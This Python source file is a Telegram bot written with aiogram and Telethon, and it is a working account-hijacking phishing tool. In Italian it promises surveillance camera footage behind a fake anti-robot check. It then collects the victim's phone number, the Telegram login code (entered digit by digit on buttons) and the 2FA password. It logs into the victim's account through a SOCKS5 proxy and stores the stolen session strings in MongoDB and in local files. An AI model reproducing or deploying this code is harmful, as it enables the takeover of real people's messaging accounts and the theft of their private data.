import logging
import os
import json
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Proxy settings
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
proxy = (proxy_type := 'socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# MongoDB
mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]

# Logging and bot setup
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# User states
user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}  # теперь будет словарь с keys: 'code' и 'message_id'

# Ensure sessions dir
os.makedirs("sessions", exist_ok=True)

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("🔐 Autorizza primo account", callback_data="auth_account")
    )
    await message.answer(
        "👋 Benvenuto! Per accedere ai materiali delle telecamere di sorveglianza, "
        "devi completare l'autorizzazione per confermare che non sei un robot.",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_phone'
    await bot.send_message(user_id, "📱 Inserisci il numero di telefono nel formato +391234567890:")
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_phone')
async def process_phone(message: types.Message):
    user_id = message.from_user.id
    phone = message.text.strip()

    # Очистка предыдущих сессий
    client = user_clients.get(user_id)
    if client:
        await client.disconnect()
        user_clients.pop(user_id, None)

    user_phones[user_id] = phone

    # Создание клиента с прокси
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=proxy)
    await client.connect()
    user_clients[user_id] = client

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        # инициализация буфера: code и message_id
        user_code_buffers[user_id] = {'code': '', 'message_id': None}

        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id

        await message.answer("⌨️ Inserisci il codice premendo i tasti qui sotto:")
    except Exception as e:
        await message.answer(f"❌ Errore nell'invio del codice: {e}")
        await client.disconnect()
        cleanup(user_id)

async def send_code_keyboard(user_id, current_code, message_id=None):
    buttons = [InlineKeyboardButton(str(i), callback_data=f"code_{i}") for i in range(10)]
    buttons.append(InlineKeyboardButton("✅ Invia", callback_data="code_send"))
    keyboard = InlineKeyboardMarkup(row_width=5).add(*buttons)
    text = f"Codice: `{current_code}`" if current_code else "Inserisci codice:"

    if message_id:
        # редактируем сообщение с кнопками и кодом
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=message_id,
            text=text,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
    else:
        # отправляем новое сообщение с кнопками и возвращаем id сообщения
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ Non è il momento giusto per inserire il codice", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="Errore interno. Riprova.", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Inserisci prima il codice", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)

    elif data == "code_clear":
        # Кнопка отмены убрана, поэтому просто ответим, что её нет
        await bot.answer_callback_query(callback_query.id, text="La cancellazione non è disponibile.", show_alert=True)

    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Codice troppo lungo", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        await bot.send_message(user_id, "⚠️ Sessione non trovata. Riprova con /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(phone=phone, code=code)

        if await client.is_user_authorized():
            session_str = client.session.save()
            sessions_col.update_one(
                {"phone": phone},
                {"$set": {"phone": phone, "session": session_str}},
                upsert=True
            )
            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await bot.send_message(user_id, "✅ Autenticazione avvenuta con successo!")
            await client.disconnect()
            cleanup(user_id)
        else:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "🔐 Inserisci la password per la 2FA:")

    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "⏰ Codice scaduto. Riprova da /start")
        await client.disconnect()
        cleanup(user_id)

    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "❌ Codice errato. Riprova:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])

    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        await bot.send_message(user_id, "🔐 È necessaria la password 2FA. Inseriscila:")

    except Exception as e:
        await bot.send_message(user_id, f"❌ Errore di accesso: {e}")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        await message.answer("⚠️ Sessione non trovata. Riprova da /start")
        cleanup(user_id)
        return

    try:
        await client.sign_in(password=password)

        if await client.is_user_authorized():
            session_str = client.session.save()
            sessions_col.update_one(
                {"phone": phone},
                {"$set": {"phone": phone, "session": session_str}},
                upsert=True
            )
            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            await message.answer("✅ Accesso 2FA riuscito! Sessione salvata.")
            await client.disconnect()
            cleanup(user_id)
        else:
            await message.answer("❌ Impossibile accedere con 2FA.")
    except Exception as e:
        await message.answer(f"❌ Errore con 2FA: {e}")
        await client.disconnect()
        cleanup(user_id)

def cleanup(user_id):
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
